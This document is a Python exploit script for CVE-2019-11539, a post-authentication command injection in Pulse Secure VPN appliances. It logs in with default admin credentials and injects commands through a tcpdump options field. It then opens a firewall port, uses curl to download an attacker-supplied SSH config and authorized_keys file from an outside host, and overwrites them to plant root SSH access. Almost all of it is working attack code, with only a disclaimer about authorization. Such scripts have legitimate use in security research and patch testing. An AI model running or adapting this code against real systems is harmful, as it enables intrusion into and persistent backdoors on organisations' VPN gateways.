#!/usr/bin/python
#
# Exploit Title: Pulse Secure Post-Auth Remote Code Execution
# Google Dork: inurl:/dana-na/ filetype:cgi
# Date: 09/05/2019
# Exploit Author: Justin Wagner (0xDezzy), Alyssa Herrera (@Alyssa_Herrera_)
# Vendor Homepage: https://pulsesecure.net
# Version: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
# Tested on: linux
# CVE : CVE-2019-11539
#
# Initial Discovery: Orange Tsai (@orange_8361), Meh Chang (@mehqq_)
#
# Exploits CVE-2019-11539 to run commands on the Pulse Secure Connect VPN
# Downloads Modified SSH configuration and authorized_keys file to allow SSH as root.
# You will need your own configuration and authorized_keys files.
#
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2019-11539
# Reference: https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
#
# Please Note, Alyssa or myself are not responsible with what is done with this code. Please use this at your own discretion and with proper authrization.
# We will not bail you out of jail, go to court, etc if you get caught using this maliciously. Be smart and remember, hugs are free.
#
# Imports
import requests
import urllib
from bs4 import BeautifulSoup

# Host information
host = '' # Host to exploit
login_url = '/dana-na/auth/url_admin/login.cgi' # Login page
CMDInjectURL = '/dana-admin/diag/diag.cgi' # Overwrites the Template when using tcpdump
CommandExecURL = '/dana-na/auth/setcookie.cgi' # Executes the code

# Login Credentials
user = 'admin' # Default Username
password = 'password' # Default Password

# Necessary for Curl
downloadHost = '' # IP or FQDN for host running webserver
port = '' # Port where web service is running. Needs to be a string, hence the quotes.

# Proxy Configuration
# Uncomment if you need to use a proxy or for debugging requests
proxies = {
    # 'http': 'http://127.0.0.1:8080',
    # 'https': 'http://127.0.0.1:8080',
}

# Headers for requests
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language':'en-US,en;q=0.5',
    'Accept-Encoding':'gzip, deflate',
    'Content-Type':'application/x-www-form-urlencoded',
}

# Cookies to send with request
cookies = {
    'lastRealm':'Admin%20Users',
    'DSSIGNIN':'url_admin',
    'DSSignInURL':'/admin/',
    'DSPERSISTMSG':'',
}

# Data for post request
loginData = {
    'tz_offset': 0,
    'username': user,
    'password': password,
    'realm': 'Admin Users',
    'btnSubmit': 'Sign In',
}

s = requests.Session() # Sets up the session
s.proxies = proxies # Sets up the proxies

# Disable Warnings from requests library
requests.packages.urllib3.disable_warnings()

# Administrator Login logic
# Probably wouldn't have figured this out without help from @buffaloverflow
def adminLogin():
    global xsAuth
    global _headers

    # Send the intial request
    r = requests.get('https://%s/dana-na/auth/url_admin/welcome.cgi' % host, cookies=cookies, headers=headers, verify=False, proxies=proxies)

    print('[#] Logging in...') # Self Explanatory
    r = s.post('https://' + host + login_url, data=loginData,verify=False, proxies=proxies, allow_redirects=False) # sends login post request
    print('[#] Sent Login Request...')

    # Login Logic
    if r.status_code == 302 and 'welcome.cgi' in r.headers.get("location",""):
        referer = 'https://%s%s' %(host, r.headers["location"]) # Gets the referer
        r = s.get(referer, verify=False) # Sends a get request
        soup = BeautifulSoup(r.text, 'html.parser') # Sets up HTML Parser
        FormDataStr = soup.find('input', {'id':'DSIDFormDataStr'})["value"] # Gets DSIDFormDataStr
        print('[#] Grabbing xsauth...')
        xsAuth = soup.find('input', {'name':'xsauth'})["value"] # Gets the cross site auth token
        print('[!] Got xsauth: ' + xsAuth) # Self Explanatory
        data = {'btnContinue':'Continue the session', 'FormDataStr':FormDataStr, 'xsauth':xsAuth} # Submits the continue session page
        _headers = headers # Sets the headers
        _headers.update({'referer':referer}) # Updates the headers
        r = s.post('https://%s' %(host + login_url), data=data, headers=_headers, verify=False, proxies=proxies) #Sends a new post request

    print('[+] Logged in!') # Self Explanatory

# Command injection logic
def cmdInject(command):
    r = s.get('https://' + host + CMDInjectURL, verify=False, proxies=proxies)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text, 'html.parser') # Sets up HTML Parser
        xsAuth = soup.find('input', {'name':'xsauth'})["value"] # Gets the cross site auth token
        payload = {
            'a':'td',
            'chkInternal':'On',
            'optIFInternal':'int0',
            'pmisc':'on',
            'filter':'',
            'options':'-r$x="%s",system$x# 2>/data/runtime/tmp/tt/setcookie.thtml.ttc <' %command,
            'toggle':'Start+Sniffing',
            'xsauth':xsAuth
        }
        # Takes the generated URL specific to the command then encodes it in hex for the DSLaunchURL cookie
        DSLaunchURL_cookie = {'DSLaunchURL':(CMDInjectURL+'?a=td&chkInternal=on&optIFInternal=int0&pmisc=on&filter=&options=-r%24x%3D%22'+urllib.quote_plus(command)+'%22%2Csystem%24x%23+2%3E%2Fdata%2Fruntime%2Ftmp%2Ftt%2Fsetcookie.thtml.ttc+%3C&toggle=Start+Sniffing&xsauth='+xsAuth).encode("hex")}
        # print('[+] Sending Command injection: %s' %command) # Self Explanatory. Useful for seeing what commands are run
        # Sends the get request to overwrite the template
        r = s.get('https://' + host + CMDInjectURL+'?a=td&chkInternal=on&optIFInternal=int0&pmisc=on&filter=&options=-r%24x%3D%22'+command+'%22%2Csystem%24x%23+2%3E%2Fdata%2Fruntime%2Ftmp%2Ftt%2Fsetcookie.thtml.ttc+%3C&toggle=Start+Sniffing&xsauth='+xsAuth, cookies=DSLaunchURL_cookie, verify=False, proxies=proxies)
        # Sends the get request to execute the code
        r = s.get('https://' + host + CommandExecURL, verify=False)

# Main logic
if __name__ == '__main__':
    adminLogin()
    try:
        print('[!] Starting Exploit')
        print('[*] Opening Firewall port...')
        cmdInject('iptables -A INPUT -p tcp --dport 6667 -j ACCEPT') # Opens SSH port
        print('[*] Downloading Necessary Files....')
        cmdInject('/home/bin/curl '+downloadHost+':'+port+'/cloud_sshd_config -o /tmp/cloud_sshd_config') # download cloud_sshd_config
        cmdInject('/home/bin/curl '+downloadHost+':'+port+'/authorized_keys -o /tmp/authorized_keys') # download authorized_keys
        print('[*] Backing up Files...')
        cmdInject('cp /etc/cloud_sshd_config /etc/cloud_sshd_config.bak') # backup cloud_sshd_config
        cmdInject('cp /.ssh/authorized_keys /.ssh/authorized_keys.bak') # backp authorized_keys
        print('[*] Overwriting Old Files...')
        cmdInject('cp /tmp/cloud_sshd_config /etc/cloud_sshd_config') # overwrite cloud_sshd_config
        cmdInject('cp /tmp/authorized_keys /.ssh/authorized_keys') # overwrite authorized_keys
        print('[*] Restarting SSHD...')
        cmdInject('kill -SIGHUP $(pgrep -f "sshd-ive")') # Restart sshd via a SIGHUP
        print('[!] Done Exploiting the system.')
        print('[!] Please use the following command:')
        print('[!] ssh -p6667 root@%s') %(host)
    except Exception as e:
        raise